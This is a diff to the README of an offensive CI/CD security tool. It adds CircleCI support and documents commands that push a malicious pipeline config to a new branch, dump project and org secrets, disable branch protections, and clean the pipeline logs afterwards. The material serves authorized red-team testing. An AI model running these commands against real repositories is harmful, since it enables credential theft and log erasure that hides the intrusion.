@@ -2,7 +2,7 @@
 
 Nord Stream is a tool that allows you extract secrets stored inside CI/CD environments by deploying _malicious_ pipelines.
 
-It currently supports Azure DevOps, GitHub and GitLab.
+It currently supports Azure DevOps, GitHub, GitLab and CircleCI.
 
 Find out more in the following blogpost: https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks
 
@@ -29,6 +29,7 @@ Find out more in the following blogpost: https://www.synacktiv.com/publications/
       - [Force](#force)
       - [Azure OIDC](#azure-oidc)
       - [AWS OIDC](#aws-oidc)
+      - [CircleCI](#circleci)
       - [Help](#help-1)
     - [GitLab](#gitlab)
       - [List secrets](#list-secrets)
@@ -500,22 +501,99 @@ AWS_ACCESS_KEY_ID=ASIA5ABC8XDMAP2ANNWO
 AWS_SECRET_ACCESS_KEY=7KJLCjdJKqlpLKDAI9F7SH6SjSQBX68Sjm13xXDA
 ```
 
+#### CircleCI
+
+The `--circleci` flag extends the GitHub subcommand to also extract secrets stored in CircleCI projects linked to GitHub repositories. It requires a CircleCI API token in addition to the GitHub token.
+
+CircleCI stores secrets in two places:
+- **Project environment variables** — scoped to a single project
+- **Contexts** — org-level, shared across projects
+
+Both are extracted automatically.
+
+##### Integration types
+
+CircleCI supports two GitHub integration modes which affect how the tool identifies the project:
+
+| Integration | `--circleci-vcs` | Project slug format |
+|---|---|---|
+| Classic GitHub OAuth | `gh` | `gh/<org>/<repo>` |
+| GitHub App | `circleci` | `circleci/<org-id>/<project-id>` |
+
+When `--circleci-vcs` is omitted, the tool auto-detects the integration type and project identifiers by scanning the CircleCI API.
+
+##### List CircleCI secrets
+
+```bash
+$ nord-stream github --token "$GHP" --org myorg --repo myrepo \
+    --circleci --circleci-token "$CCT" --list-secrets
+[*] Listing CircleCI secrets (names only):
+[*] "myorg/myrepo" CircleCI secrets
+[*] Project environment variables:
+        - DATABASE_URL
+        - API_KEY
+        - DEPLOY_TOKEN
+[*] No org contexts found.
+```
+
+##### Extract CircleCI secrets
+
+Injects a malicious `.circleci/config.yml` into a new branch, waits for the CircleCI pipeline to run, then extracts and deletes the branch.
+
+```bash
+$ nord-stream github --token "$GHP" --org myorg --repo myrepo \
+    --circleci --circleci-token "$CCT"
+[+] "myorg/myrepo" (CircleCI)
+[*] Found CircleCI secrets for "myorg/myrepo":
+[*]   Project env vars (3): DATABASE_URL, API_KEY, DEPLOY_TOKEN
+[*] Pushing to branch "dev_remote_ea5Eu/test/v1"
+[*] Waiting for CircleCI pipeline to complete
+[+] Pipeline completed successfully.
+[+] Secrets:
+secret_DATABASE_URL=postgres://user:pass@host:5432/db
+secret_API_KEY=sk-...
+secret_DEPLOY_TOKEN=ghp_...
+
+[*] Cleaning CircleCI pipeline logs.
+[*] Check output: nord-stream-logs/circleci
+```
+
+##### GitHub App integration
+
+For repositories using the CircleCI GitHub App integration, the org and project are identified by UUIDs rather than names. These can be supplied explicitly or detected automatically:
+
+```bash
+# Auto-detect (scans CircleCI API to find the project)
+$ nord-stream github --token "$GHP" --org myorg --repo myrepo \
+    --circleci --circleci-token "$CCT" --circleci-vcs circleci
+
+# Explicit (faster, no API scan)
+$ nord-stream github --token "$GHP" --org myorg --repo myrepo \
+    --circleci --circleci-token "$CCT" \
+    --circleci-vcs circleci \
+    --circleci-org <org-uuid> \
+    --circleci-project <project-uuid>
+```
+
 #### Help
 ```
 $ nord-stream github -h
 CICD pipeline exploitation tool
 
 Usage:
-    nord-stream github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
-    nord-stream github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
+    nord-stream github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean]
     nord-stream github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
-    nord-stream github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--env <env>]
-    nord-stream github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--azure-subscription-id <subscription> --repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--build-type <type> --env <env>]
+    nord-stream github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
     nord-stream github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
-    nord-stream github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections (--key-id <id> --user <user> --email <email>)]
+    nord-stream github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections]
     nord-stream github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
     nord-stream github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
     nord-stream github [options] --token <ghp> --describe-token
+    nord-stream github [options] --token <ghp> --org <org> --circleci [--repo <repo> --no-repo --no-org --branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --circleci --yaml <yaml> --repo <repo> [--branch-name <name> --no-clean]
+    nord-stream github [options] --token <ghp> --org <org> --circleci --list-secrets [--repo <repo> --no-repo --no-org]
 
 Options:
     -h --help                               Show this screen.
@@ -524,12 +602,12 @@ Options:
     -d, --debug                             Debug mode
     --output-dir <dir>                      Output directory for logs
 
-Signing:
-    --key-id <id>                           GPG primary key ID
-    --user <user>                           User used to sign commits
-    --email <email>                         Email address used to sign commits
+Commit:
+    --user <user>                           User used to commit
+    --email <email>                         Email address used commit
+    --key-id <id>                           GPG primary key ID to sign commits
 
-args
+args:
     --token <ghp>                           Github personal token
     --org <org>                             Org name
     -r, --repo <repo>                       Run on selected repo (can be a file)
@@ -538,6 +616,7 @@ args
     --no-clean                              Don't clean workflow logs (default false)
     --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
     --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
+    --build-type <type>                     Type used to generate the yaml file can be: default, azureoidc, awsoidc
     --env <env>                             Specify env for the yaml file creation.
     --no-repo                               Don't extract repo secrets.
     --no-env                                Don't extract environnments secrets.
@@ -555,6 +634,12 @@ args
     --force                                 Don't check environment and branch protections.
     --branch-name <name>                    Use specific branch name for deployment.
     --describe-token                        Display information on the token
+    --circleci                              Target CircleCI pipelines instead of GitHub Actions
+    --circleci-token <cct>                  CircleCI API token (required when --circleci is used)
+    --circleci-vcs <vcs>                    CircleCI VCS type: gh, gl, or circleci (GitHub App).
+                                            Auto-detected from the CircleCI API when omitted.
+    --circleci-org <corg>                   CircleCI org name or UUID (defaults to --org value)
+    --circleci-project <cproject>           CircleCI project name or UUID
 
 Examples:
     List all secrets from all repositories
@@ -562,6 +647,12 @@ Examples:
 
     Dump all secrets from all repositories and try to disable branch protections
     $ nord-stream github --token "$GHP" --org myorg --disable-protections
+
+    List CircleCI secrets for all repositories
+    $ nord-stream github --token "$GHP" --org myorg --circleci --circleci-token "$CCT" --list-secrets
+
+    Dump CircleCI secrets from all repositories
+    $ nord-stream github --token "$GHP" --org myorg --circleci --circleci-token "$CCT"
 
 Authors: @hugow @0hexit
 ```
@@ -667,6 +758,7 @@ Authors: @hugow @0hexit
 - [ ] Add an option to extract secrets via Windows hosts
 - [ ] Add support of other CI/CD environments (Jenkins/Bitbucket)
 - [ ] Use the GitHub GraphQL API instead of the REST one to list the branch protection rules and temporarily disable them if they match the malicious branch about to be pushed
+- [ ] CircleCI extraction via GitLab-hosted repositories (`gitlab --circleci`)
 
 
 ## Contact
